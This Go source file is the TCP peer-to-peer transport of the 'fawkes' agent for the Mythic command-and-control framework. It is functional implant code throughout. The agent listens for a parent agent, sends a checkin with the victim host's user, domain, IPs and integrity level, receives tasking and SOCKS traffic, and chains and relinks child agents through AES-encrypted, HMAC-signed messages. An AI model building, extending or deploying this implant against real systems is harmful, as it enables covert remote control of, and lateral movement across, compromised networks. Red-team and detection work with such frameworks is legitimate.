package tcp

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

// TCPProfile handles TCP P2P communication with a parent agent or Mythic (via linked egress agent).
// In P2P mode, this agent does NOT talk to Mythic directly — it sends/receives through a parent agent.
type TCPProfile struct {
	BindAddress   string // Address to listen on (e.g., "0.0.0.0:7777") — listener mode
	EncryptionKey string // Base64-encoded AES key (same as HTTP profile)
	Debug         bool

	CallbackUUID string // Set after checkin

	// Parent connection (this agent connects to parent, or parent connects to us)
	parentConn net.Conn
	parentMu   sync.Mutex

	// Child connections (agents that linked to us)
	childConns map[string]net.Conn // UUID → connection
	childMu    sync.RWMutex

	// Channels for delegate message routing
	InboundDelegates  chan structs.DelegateMessage      // Messages from child agents → forward to parent/Mythic
	OutboundDelegates chan []structs.DelegateMessage    // Messages from parent/Mythic → route to child agents
	EdgeMessages      chan structs.P2PConnectionMessage // Edge add/remove notifications

	// UUID mapping for staging (temp UUID → Mythic UUID)
	uuidMapping map[string]string
	uuidMu      sync.RWMutex

	// Listener for incoming P2P connections
	listener net.Listener

	// Relink support: stored checkin data so child can re-checkin with a new parent
	cachedCheckinData []byte // base64-encoded checkin message (UUID + encrypted body)
	needsParent       bool   // set when parent disconnects; next accepted connection becomes parent
	needsParentMu     sync.Mutex
	parentReady       chan struct{} // signaled when a new parent connection is established
}

// NewTCPProfile creates a new TCP profile for P2P communication.
func NewTCPProfile(bindAddress, encryptionKey string, debug bool) *TCPProfile {
	return &TCPProfile{
		BindAddress:       bindAddress,
		EncryptionKey:     encryptionKey,
		Debug:             debug,
		childConns:        make(map[string]net.Conn),
		InboundDelegates:  make(chan structs.DelegateMessage, 100),
		OutboundDelegates: make(chan []structs.DelegateMessage, 100),
		EdgeMessages:      make(chan structs.P2PConnectionMessage, 20),
		uuidMapping:       make(map[string]string),
		parentReady:       make(chan struct{}, 1),
	}
}

// Checkin performs the initial checkin via TCP.
// For a P2P child agent, this sends the checkin message to the parent agent who forwards it to Mythic.
func (t *TCPProfile) Checkin(agent *structs.Agent) error {
	// TCP child agents wait for an incoming connection from the parent (egress) agent.
	// The parent connects to us via the link command, so we listen.
	if t.BindAddress == "" {
		return fmt.Errorf("TCP profile requires a bind address")
	}

	var err error
	t.listener, err = net.Listen("tcp", t.BindAddress)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", t.BindAddress, err)
	}
	log.Printf("[TCP] Listening on %s for parent connection", t.BindAddress)

	// Wait for the parent agent to connect (with timeout)
	t.listener.(*net.TCPListener).SetDeadline(time.Now().Add(5 * time.Minute))
	conn, err := t.listener.Accept()
	if err != nil {
		t.listener.Close()
		return fmt.Errorf("failed to accept parent connection: %w", err)
	}
	t.parentMu.Lock()
	t.parentConn = conn
	t.parentMu.Unlock()
	log.Printf("[TCP] Parent connected from %s", conn.RemoteAddr())

	// Send checkin message to parent
	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin: %w", err)
	}

	// Encrypt if key provided
	if t.EncryptionKey != "" {
		body = t.encryptMessage(body)
	}

	// Frame: UUID + encrypted body
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Cache checkin data for potential relink
	t.cachedCheckinData = []byte(encodedData)

	// Send via TCP (length-prefixed)
	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
		return fmt.Errorf("failed to send checkin: %w", err)
	}

	// Read checkin response from parent
	respData, err := t.recvTCP(conn)
	if err != nil {
		return fmt.Errorf("failed to receive checkin response: %w", err)
	}

	// Decrypt response
	var decryptedResponse []byte
	if t.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
		if err != nil {
			return fmt.Errorf("failed to decode checkin response: %w", err)
		}
		decryptedResponse, err = t.decryptResponse(decodedData)
		if err != nil {
			return fmt.Errorf("failed to decrypt checkin response: %w", err)
		}
	} else {
		decryptedResponse = respData
	}

	// Parse response for callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			t.CallbackUUID = callbackStr
			log.Printf("[TCP] Received callback UUID: %s", t.CallbackUUID)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			t.CallbackUUID = callbackStr
			log.Printf("[TCP] Received callback UUID: %s", t.CallbackUUID)
		}
	} else {
		log.Printf("[TCP] No callback UUID in response, using payload UUID")
		t.CallbackUUID = agent.PayloadUUID
	}

	// Continue accepting connections in the background for additional child links
	go t.acceptChildConnections()

	return nil
}

// GetTasking retrieves tasks from the parent agent via TCP.
func (t *TCPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	t.parentMu.Lock()
	conn := t.parentConn
	t.parentMu.Unlock()

	if conn == nil {
		// Parent is dead — trigger relink and wait for a new parent
		t.triggerRelink()
		return nil, nil, fmt.Errorf("no parent connection, waiting for relink")
	}

	// Collect any delegate messages from children to forward upstream
	var delegates []structs.DelegateMessage
	for {
		select {
		case d := <-t.InboundDelegates:
			delegates = append(delegates, d)
		default:
			goto done
		}
	}
done:

	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1,
		Socks:       outboundSocks,
		Delegates:   delegates,
		PayloadUUID: t.getActiveUUID(agent),
		PayloadType: "fawkes",
		C2Profile:   "tcp",
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking: %w", err)
	}

	if t.EncryptionKey != "" {
		body = t.encryptMessage(body)
	}

	activeUUID := t.getActiveUUID(agent)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
		t.handleDeadParent()
		return nil, nil, fmt.Errorf("failed to send tasking request: %w", err)
	}

	respData, err := t.recvTCP(conn)
	if err != nil {
		t.handleDeadParent()
		return nil, nil, fmt.Errorf("failed to receive tasking response: %w", err)
	}

	var decryptedData []byte
	if t.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
		}
		decryptedData, err = t.decryptResponse(decodedData)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
	} else {
		decryptedData = respData
	}

	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		return []structs.Task{}, nil, nil
	}

	// Extract tasks
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.NewTask(
						getString(taskMap, "id"),
						getString(taskMap, "command"),
						getString(taskMap, "parameters"),
					)
					tasks = append(tasks, task)
				}
			}
		}
	}

	// Extract SOCKS messages
	var inboundSocks []structs.SocksMsg
	if socksList, exists := taskResponse["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			_ = json.Unmarshal(socksRaw, &inboundSocks)
		}
	}

	// Extract delegate messages for children and route them
	if delegateList, exists := taskResponse["delegates"]; exists {
		if delegateRaw, err := json.Marshal(delegateList); err == nil {
			var incomingDelegates []structs.DelegateMessage
			if err := json.Unmarshal(delegateRaw, &incomingDelegates); err == nil {
				t.routeDelegatesToChildren(incomingDelegates)
			}
		}
	}

	return tasks, inboundSocks, nil
}

// PostResponse sends a response back through the parent TCP connection.
func (t *TCPProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	t.parentMu.Lock()
	conn := t.parentConn
	t.parentMu.Unlock()

	if conn == nil {
		return nil, fmt.Errorf("no parent connection, waiting for relink")
	}

	// Collect delegate messages and edge notifications
	var delegates []structs.DelegateMessage
	for {
		select {
		case d := <-t.InboundDelegates:
			delegates = append(delegates, d)
		default:
			goto doneDelegates
		}
	}
doneDelegates:

	var edges []structs.P2PConnectionMessage
	for {
		select {
		case e := <-t.EdgeMessages:
			edges = append(edges, e)
		default:
			goto doneEdges
		}
	}
doneEdges:

	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
		Delegates: delegates,
		Edges:     edges,
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response: %w", err)
	}

	if t.EncryptionKey != "" {
		body = t.encryptMessage(body)
	}

	activeUUID := t.getActiveUUID(agent)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
		t.handleDeadParent()
		return nil, fmt.Errorf("failed to send response: %w", err)
	}

	respData, err := t.recvTCP(conn)
	if err != nil {
		t.handleDeadParent()
		return nil, fmt.Errorf("failed to receive PostResponse reply: %w", err)
	}

	var decryptedData []byte
	if t.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
		if err != nil {
			return nil, fmt.Errorf("failed to decode PostResponse reply: %w", err)
		}
		decryptedData, err = t.decryptResponse(decodedData)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt PostResponse reply: %w", err)
		}
	} else {
		decryptedData = respData
	}

	// Route any delegate responses to children
	var postRespData map[string]interface{}
	if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
		if delegateList, exists := postRespData["delegates"]; exists {
			if delegateRaw, err := json.Marshal(delegateList); err == nil {
				var incomingDelegates []structs.DelegateMessage
				if err := json.Unmarshal(delegateRaw, &incomingDelegates); err == nil {
					t.routeDelegatesToChildren(incomingDelegates)
				}
			}
		}
	}

	return decryptedData, nil
}

// AddChildConnection registers a new linked child agent connection.
// Called by the link command when an egress agent connects to a child.
func (t *TCPProfile) AddChildConnection(uuid string, conn net.Conn) {
	t.childMu.Lock()
	t.childConns[uuid] = conn
	t.childMu.Unlock()

	// Start reading from this child in a goroutine
	go t.readFromChild(uuid, conn)
}

// RemoveChildConnection removes a linked child agent connection.
func (t *TCPProfile) RemoveChildConnection(uuid string) {
	t.childMu.Lock()
	if conn, ok := t.childConns[uuid]; ok {
		conn.Close()
		delete(t.childConns, uuid)
	}
	t.childMu.Unlock()
}

// GetChildUUIDs returns the UUIDs of all connected child agents.
func (t *TCPProfile) GetChildUUIDs() []string {
	t.childMu.RLock()
	defer t.childMu.RUnlock()
	uuids := make([]string, 0, len(t.childConns))
	for uuid := range t.childConns {
		uuids = append(uuids, uuid)
	}
	return uuids
}

// DrainDelegatesOnly non-blockingly drains only pending delegate messages (not edges).
// Used by GetTasking which cannot include edges in the request.
func (t *TCPProfile) DrainDelegatesOnly() []structs.DelegateMessage {
	var delegates []structs.DelegateMessage
	for {
		select {
		case d := <-t.InboundDelegates:
			delegates = append(delegates, d)
		default:
			return delegates
		}
	}
}

// DrainDelegatesAndEdges non-blockingly drains all pending delegate messages and edge notifications.
// Used by PostResponse which can include both delegates and edges.
func (t *TCPProfile) DrainDelegatesAndEdges() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
	var delegates []structs.DelegateMessage
	var edges []structs.P2PConnectionMessage
	for {
		select {
		case d := <-t.InboundDelegates:
			delegates = append(delegates, d)
		default:
			goto doneD
		}
	}
doneD:
	for {
		select {
		case e := <-t.EdgeMessages:
			edges = append(edges, e)
		default:
			goto doneE
		}
	}
doneE:
	return delegates, edges
}

// RouteToChildren routes delegate messages from Mythic to the appropriate child TCP connections.
// Used by the HTTP profile's HandleDelegates hook.
func (t *TCPProfile) RouteToChildren(delegates []structs.DelegateMessage) {
	t.routeDelegatesToChildren(delegates)
}

// --- Internal methods ---

// handleDeadParent marks the parent connection as dead and triggers relink.
func (t *TCPProfile) handleDeadParent() {
	t.parentMu.Lock()
	if t.parentConn != nil {
		t.parentConn.Close()
		t.parentConn = nil
	}
	t.parentMu.Unlock()

	t.needsParentMu.Lock()
	t.needsParent = true
	t.needsParentMu.Unlock()

	log.Printf("[TCP] Parent connection dead, waiting for relink")
}

// triggerRelink signals that this agent needs a new parent and blocks until one connects.
func (t *TCPProfile) triggerRelink() {
	t.needsParentMu.Lock()
	alreadyNeeds := t.needsParent
	t.needsParent = true
	t.needsParentMu.Unlock()

	// No listener means no way to accept a new parent — don't block
	if t.listener == nil {
		return
	}

	if !alreadyNeeds {
		log.Printf("[TCP] Triggering relink — waiting for new parent connection")
	}

	// Wait for acceptChildConnections to provide a new parent (with timeout)
	// The main loop will retry after its normal sleep interval
	select {
	case <-t.parentReady:
		log.Printf("[TCP] New parent connected via relink")
	case <-time.After(5 * time.Second):
		// Short wait — main loop will retry
	}
}

// acceptChildConnections keeps accepting new TCP connections after initial checkin.
// These are additional child agents linking to this agent, OR a new parent during relink.
func (t *TCPProfile) acceptChildConnections() {
	if t.listener == nil {
		return
	}
	// Remove the deadline for ongoing accept
	t.listener.(*net.TCPListener).SetDeadline(time.Time{})
	for {
		conn, err := t.listener.Accept()
		if err != nil {
			log.Printf("[TCP] Accept error: %v", err)
			return
		}

		// Check if we need a new parent (relink scenario)
		t.needsParentMu.Lock()
		needsParent := t.needsParent
		t.needsParentMu.Unlock()

		if needsParent {
			log.Printf("[TCP] New parent connection from %s (relink)", conn.RemoteAddr())
			go t.handleRelink(conn)
		} else {
			log.Printf("[TCP] New child connection from %s", conn.RemoteAddr())
			go t.handleNewChildCheckin(conn)
		}
	}
}

// handleRelink handles a new parent connection after the previous parent disconnected.
// It re-sends the cached checkin data so the new parent can forward it to Mythic as a delegate.
func (t *TCPProfile) handleRelink(conn net.Conn) {
	if len(t.cachedCheckinData) == 0 {
		log.Printf("[TCP] No cached checkin data for relink, treating as child")
		t.handleNewChildCheckin(conn)
		return
	}

	// Send cached checkin data to the new parent
	if err := t.sendTCP(conn, t.cachedCheckinData); err != nil {
		log.Printf("[TCP] Failed to send checkin to new parent: %v", err)
		conn.Close()
		return
	}
	log.Printf("[TCP] Sent cached checkin to new parent")

	// Read checkin response from parent (Mythic's response forwarded by parent)
	respData, err := t.recvTCP(conn)
	if err != nil {
		log.Printf("[TCP] Failed to receive relink checkin response: %v", err)
		conn.Close()
		return
	}

	// Process response — update callback UUID if provided
	if t.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
		if err == nil {
			decryptedResponse, err := t.decryptResponse(decodedData)
			if err == nil {
				var checkinResponse map[string]interface{}
				if err := json.Unmarshal(decryptedResponse, &checkinResponse); err == nil {
					if callbackID, exists := checkinResponse["id"]; exists {
						if callbackStr, ok := callbackID.(string); ok {
							t.CallbackUUID = callbackStr
						}
					}
				}
			}
		}
	}

	// Set as new parent connection
	t.parentMu.Lock()
	t.parentConn = conn
	t.parentMu.Unlock()

	// Clear the needs-parent flag
	t.needsParentMu.Lock()
	t.needsParent = false
	t.needsParentMu.Unlock()

	// Signal that parent is ready
	select {
	case t.parentReady <- struct{}{}:
	default:
	}

	log.Printf("[TCP] Relink complete — new parent from %s", conn.RemoteAddr())
}

// handleNewChildCheckin reads the initial checkin from a new child connection,
// wraps it as a delegate message, and forwards to Mythic through InboundDelegates.
func (t *TCPProfile) handleNewChildCheckin(conn net.Conn) {
	data, err := t.recvTCP(conn)
	if err != nil {
		log.Printf("[TCP] Failed to read child checkin: %v", err)
		conn.Close()
		return
	}

	// The child's checkin is base64(UUID + encrypted_body)
	// We need to extract the UUID to track this connection
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil || len(decoded) < 36 {
		log.Printf("[TCP] Invalid child checkin data")
		conn.Close()
		return
	}
	childUUID := string(decoded[:36])

	// Register this child connection
	t.childMu.Lock()
	t.childConns[childUUID] = conn
	t.childMu.Unlock()

	// Forward the checkin as a delegate message to Mythic
	t.InboundDelegates <- structs.DelegateMessage{
		Message:       string(data), // Already base64 encoded
		UUID:          childUUID,
		C2ProfileName: "tcp",
	}

	// Start reading from this child
	go t.readFromChild(childUUID, conn)
}

// StartReadFromChild starts a goroutine to continuously read messages from a child connection.
// Used by the link command after establishing a connection to a child agent.
func (t *TCPProfile) StartReadFromChild(uuid string, conn net.Conn) {
	go t.readFromChild(uuid, conn)
}

// readFromChild continuously reads messages from a child connection
// and forwards them as delegate messages to the parent/Mythic.
func (t *TCPProfile) readFromChild(uuid string, conn net.Conn) {
	for {
		data, err := t.recvTCP(conn)
		if err != nil {
			log.Printf("[TCP] Child %s disconnected: %v", uuid[:8], err)
			t.RemoveChildConnection(t.resolveUUID(uuid))
			// Send edge removal
			t.EdgeMessages <- structs.P2PConnectionMessage{
				Source:        t.CallbackUUID,
				Destination:   t.resolveUUID(uuid),
				Action:        "remove",
				C2ProfileName: "tcp",
			}
			return
		}

		// Forward as delegate message
		t.InboundDelegates <- structs.DelegateMessage{
			Message:       string(data),
			UUID:          t.resolveUUID(uuid),
			C2ProfileName: "tcp",
		}
	}
}

// routeDelegatesToChildren routes delegate messages from Mythic to the appropriate child connections.
func (t *TCPProfile) routeDelegatesToChildren(delegates []structs.DelegateMessage) {
	for _, d := range delegates {
		// Handle UUID mapping (staging: Mythic corrects temp UUID to real UUID)
		if d.MythicUUID != "" && d.MythicUUID != d.UUID {
			t.uuidMu.Lock()
			t.uuidMapping[d.UUID] = d.MythicUUID
			// Update child connection tracking
			t.childMu.Lock()
			if conn, ok := t.childConns[d.UUID]; ok {
				t.childConns[d.MythicUUID] = conn
				delete(t.childConns, d.UUID)
			}
			t.childMu.Unlock()
			t.uuidMu.Unlock()
		}

		targetUUID := d.UUID
		if d.MythicUUID != "" {
			targetUUID = d.MythicUUID
		}

		t.childMu.RLock()
		conn, ok := t.childConns[targetUUID]
		t.childMu.RUnlock()

		if !ok {
			// Try original UUID
			t.childMu.RLock()
			conn, ok = t.childConns[d.UUID]
			t.childMu.RUnlock()
		}

		if ok {
			if err := t.sendTCP(conn, []byte(d.Message)); err != nil {
				log.Printf("[TCP] Failed to forward delegate to %s: %v", targetUUID[:8], err)
				t.RemoveChildConnection(targetUUID)
			}
		} else {
			log.Printf("[TCP] No child connection for UUID %s", targetUUID[:8])
		}
	}
}

// resolveUUID maps a temporary UUID to its Mythic-assigned UUID if mapping exists.
func (t *TCPProfile) resolveUUID(uuid string) string {
	t.uuidMu.RLock()
	defer t.uuidMu.RUnlock()
	if mapped, ok := t.uuidMapping[uuid]; ok {
		return mapped
	}
	return uuid
}

// GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
func (t *TCPProfile) GetCallbackUUID() string {
	return t.CallbackUUID
}

func (t *TCPProfile) getActiveUUID(agent *structs.Agent) string {
	if t.CallbackUUID != "" {
		return t.CallbackUUID
	}
	return agent.PayloadUUID
}

// --- TCP framing: length-prefixed messages ---

// sendTCP sends a length-prefixed message over TCP.
// Format: [4 bytes big-endian length][payload]
func (t *TCPProfile) sendTCP(conn net.Conn, data []byte) error {
	length := uint32(len(data))
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, length)

	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	if _, err := conn.Write(header); err != nil {
		return fmt.Errorf("failed to write length header: %w", err)
	}
	if _, err := conn.Write(data); err != nil {
		return fmt.Errorf("failed to write data: %w", err)
	}
	return nil
}

// recvTCP reads a length-prefixed message from TCP.
func (t *TCPProfile) recvTCP(conn net.Conn) ([]byte, error) {
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, fmt.Errorf("failed to read length header: %w", err)
	}

	length := binary.BigEndian.Uint32(header)
	if length > 10*1024*1024 { // 10 MB max message size
		return nil, fmt.Errorf("message too large: %d bytes", length)
	}

	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return nil, fmt.Errorf("failed to read message body: %w", err)
	}

	return data, nil
}

// --- Encryption (same as HTTP profile) ---

func (t *TCPProfile) encryptMessage(msg []byte) []byte {
	if t.EncryptionKey == "" {
		return msg
	}

	key, err := base64.StdEncoding.DecodeString(t.EncryptionKey)
	if err != nil {
		return msg
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return msg
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return msg
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	padded := pkcs7Pad(msg, aes.BlockSize)
	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)

	// Freyja format: IV + Ciphertext + HMAC
	ivCiphertext := append(iv, encrypted...)
	mac := hmac.New(sha256.New, key)
	mac.Write(ivCiphertext)
	hmacBytes := mac.Sum(nil)

	return append(ivCiphertext, hmacBytes...)
}

func (t *TCPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
	if t.EncryptionKey == "" {
		return encryptedData, nil
	}

	key, err := base64.StdEncoding.DecodeString(t.EncryptionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	if len(encryptedData) < 36+16+32 {
		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
	}

	iv := encryptedData[36:52]
	hmacBytes := encryptedData[len(encryptedData)-32:]
	ciphertext := encryptedData[52 : len(encryptedData)-32]

	// Verify HMAC
	mac := hmac.New(sha256.New, key)
	mac.Write(encryptedData[:len(encryptedData)-32])
	expectedHmac := mac.Sum(nil)

	if !hmac.Equal(hmacBytes, expectedHmac) {
		// Try alternative: HMAC on IV + ciphertext only
		mac2 := hmac.New(sha256.New, key)
		mac2.Write(encryptedData[36 : len(encryptedData)-32])
		expectedHmac2 := mac2.Sum(nil)
		if !hmac.Equal(hmacBytes, expectedHmac2) {
			return nil, fmt.Errorf("HMAC verification failed")
		}
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	if len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("invalid ciphertext length: %d", len(ciphertext))
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS#7 padding
	padding := int(plaintext[len(plaintext)-1])
	if padding > aes.BlockSize || padding == 0 {
		return nil, fmt.Errorf("invalid padding")
	}
	for i := len(plaintext) - padding; i < len(plaintext); i++ {
		if plaintext[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding")
		}
	}

	return plaintext[:len(plaintext)-padding], nil
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := make([]byte, padding)
	for i := range padText {
		padText[i] = byte(padding)
	}
	return append(data, padText...)
}

// getString safely gets a string value from a map
func getString(m map[string]interface{}, key string) string {
	if val, exists := m[key]; exists {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}
